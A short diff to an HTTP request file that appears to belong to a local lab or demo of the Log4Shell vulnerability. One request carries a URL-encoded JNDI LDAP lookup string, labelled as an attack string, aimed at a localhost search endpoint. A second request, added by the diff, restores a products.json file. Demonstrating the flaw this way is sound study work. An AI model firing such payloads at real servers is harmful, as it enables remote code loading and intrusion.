@@ -1,3 +1,6 @@
 ### Send GET request with attack string
 GET http://127.0.0.1:8080/search/%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3001%2F%7D
-Accept: application/json
+
+
+### Send GET request to restore the products.json
+GET http://127.0.0.1:8080/restore
